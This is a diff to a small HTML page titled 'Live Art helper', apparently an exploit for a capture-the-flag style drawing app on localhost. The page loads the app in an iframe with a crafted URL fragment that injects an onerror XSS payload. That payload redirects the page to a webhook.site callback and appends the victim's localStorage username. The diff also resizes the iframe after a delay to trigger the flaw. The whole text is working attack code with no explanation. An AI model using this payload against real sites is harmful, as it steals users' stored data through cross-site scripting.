@@ -1,9 +1,10 @@
 <!doctype html>
 <meta charset="utf-8">
 <title>Live Art helper</title>
-<iframe id="victim" width="1000" height="1000"></iframe>
+<iframe id="victim" width="300" height="300"></iframe>
 <script>
 const frame = document.getElementById("victim");
 const callback = "https://webhook.site/8b5ed8c7-28ad-4df5-a974-6f4de6d30f35";
 frame.src = "http://localhost:4000/drawing/abcd#src=1&onerror=window.location%3d%60" + callback + "%2F%24%7BencodeURIComponent(JSON.parse(localStorage.username))%7D%60&is";
+setTimeout(() => { frame.width = 1000; frame.height = 1000; }, 1000);
 </script>
